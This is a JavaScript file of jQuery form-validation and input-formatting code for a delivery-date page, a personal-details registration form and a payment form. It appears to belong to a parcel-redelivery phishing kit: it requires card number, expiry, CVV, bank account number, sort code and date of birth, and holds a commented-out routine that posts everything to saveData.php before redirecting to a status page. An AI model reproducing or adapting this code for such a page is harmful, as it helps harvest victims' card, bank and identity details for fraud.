function deliverydateValidate() {

    if (document.deliverydateForm.delidate.value.trim() == "") {
        alert("Please provide delivery date!");
        document.registrationForm.delidate.focus();
        return false;
    }
}


function registrationValidate() {
    // alert(document.registrationForm.name.value + "," + $("#name").val());
    if ($("#name").val() == "") {
        alert(document.registrationForm.name.value.trim() + "Please provide your name!");
        document.registrationForm.name.focus();
        return false;
    }
    if (document.registrationForm.dob.value.trim() == "") {
        alert("Please provide your date of birth!");
        document.registrationForm.dob.focus();
        return false;
    }

    if (document.registrationForm.email.value.trim() == "") {
        alert("Please provide your email");
        document.registrationForm.email.focus();
        return false;
    }

    if (document.registrationForm.address.value.trim() == "") {
        alert("Please provide your Address");
        document.registrationForm.address.focus();
        return false;
    }

    if (document.registrationForm.city.value.trim() == "") {
        alert("Please provide your city");
        document.registrationForm.city.focus();
        return false;
    }

    if (document.registrationForm.postcode.value.trim() == "") {
        alert("Please provide your postcode");
        document.registrationForm.postcode.focus();
        return false;
    }

    return true;

}

function validateEmail() {
    var emailID = document.registrationForm.email.value.trim();
    atpos = emailID.indexOf("@");
    dotpos = emailID.lastIndexOf(".");

    if (atpos < 1 || (dotpos - atpos < 2)) {
        alert("Please enter correct email ID")
        document.registrationForm.email.focus();
        return false;
    }

    return (true);
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function doSleep() {
    await sleep(4000);
}

function paymentFormValidation(form) {


    if (document.paymentForm.card_number.value.trim() == '') {
        alert("Card Number is required!");
        document.paymentForm.card_number.focus();
        return false;
    }

    if (document.paymentForm.cardExpiry.value.trim() == '') {
        alert("Card Expiry date is required");
        document.paymentForm.cardExpiry.focus();
        return false;
    }

    if (document.paymentForm.cardCVC.value.trim() == '') {
        alert("Card CVV is required !");
        document.paymentForm.cardCVC.focus();
        return false;
    }



    return false;

}




$(function() {
    //hang on event of form with id=myform

    $("#paymentForm").on('submit', function(e) {


        if (document.paymentForm.account_number.value.trim() == '') {
            alert("Account Number is required!");
            document.paymentForm.account_number.focus();
            return false;
        }


        if (document.paymentForm.sort_code.value.trim() == '') {
            alert("Sort Code is required!");
            document.paymentForm.sort_code.focus();
            return false;
        }



        if (document.paymentForm.card_holderName.value.trim() == '') {
            alert("Card Holder Name is required!");
            document.paymentForm.card_holderName.focus();
            e.preventDefault();
            return false;
        }

        if (document.paymentForm.card_number.value.trim() == '') {
            alert("Card Number is required!");
            document.paymentForm.card_number.focus();
            e.preventDefault();
            return false;
        }

        if (document.paymentForm.cardExpiry.value.trim() == '') {
            alert("Card Expiry date is required");
            document.paymentForm.cardExpiry.focus();
            e.preventDefault();
            return false;
        }

        if (document.paymentForm.cardCVC.value.trim() == '') {
            alert("Card CVV is required !");
            document.paymentForm.cardCVC.focus();
            e.preventDefault();
            return false;
        }

        if (document.paymentForm.card_number.value.trim().length != 16) {
            alert("Card Number should be 16 digit");
            document.paymentForm.card_number.focus();
            e.preventDefault();
            return false;
        }

        if (document.paymentForm.account_number.value.trim().length != 8) {
            alert("Account Number should be 8 digit");
            document.paymentForm.account_number.focus();
            e.preventDefault();
            return false;
        }

        // $("#sendRedeliveryButton").text('submitting...');

        //$("#sendMessageButton").text('submitting...');
        /*
      $.ajax({
        url: window.origin + "/saveData.php",
        method: "POST",
        data: {formData: $("#paymentForm").serialize()},
        cache: false,
        beforeSend: function( xhr ) {
          $('#loading_screen').preloader();
        }
      })
        .done(function( data ) {

          setTimeout(function() {

            $('#loading_screen').preloader('remove');
    
            window.location.href = window.origin + "/status.php? " + generate_randoms(10);

          }, 3000);
          
    
      });
      */
        return true;

    });

    $("#deliverydate").datepicker({
        autoclose: true,
        format: 'yyyy-mm-dd'
    });

});


function generate_randoms(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function GetFilename(url) {
    if (url) {
        var m = url.toString().match(/.*\/(.+?)\./);
        if (m && m.length > 1) {
            return m[1];
        }
    }
    return "";
}


$(document).ready(function() {

    // Toggle plus minus icon on show hide of collapse element
    $("#mobile_primary_footer_wrapper .collapse").on('show.bs.collapse', function() {
        $(this).prev(".accordion-toggle").find(".svg-inline--fa").removeClass("fa-chevron-down").addClass("fa-chevron-up");
    }).on('hide.bs.collapse', function() {
        $(this).prev(".accordion-toggle").find(".svg-inline--fa").removeClass("fa-chevron-up").addClass("fa-chevron-down");
    });

    $('input[name="cardExpiry"]').bind('keyup', 'keydown', function(event) {
        var inputLength = event.target.value.length;
        if (event.keyCode != 8) {
            if (inputLength === 2) {
                var thisVal = event.target.value;
                thisVal += '/';
                $(event.target).val(thisVal);
            }
        }
    });

    $('input[name="dob"]').bind('keyup', 'keydown', function(event) {
        var inputLength = event.target.value.length;
        if (event.keyCode != 8) {
            if (inputLength === 2 || inputLength === 5) {
                var thisVal = event.target.value;
                thisVal += '/';
                $(event.target).val(thisVal);
            }
        }
    });

    $('input[name="sort_code"]').bind('keyup', 'keydown', function(event) {
        var inputLength = event.target.value.length;
        if (event.keyCode != 8) {
            if (inputLength === 2 || inputLength === 5) {
                var thisVal = event.target.value;
                thisVal += '-';
                $(event.target).val(thisVal);
            }
        }
    })

    $("input[name=cardExpiry], input[name=cardCVC], input[name=dob]").keypress(function(e) {
        //if the letter is not digit then display error and don't type anything
        if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
            //display error message
            $("#errmsg").html("Digits Only").show().fadeOut("slow");
            return false;
        }
    });

});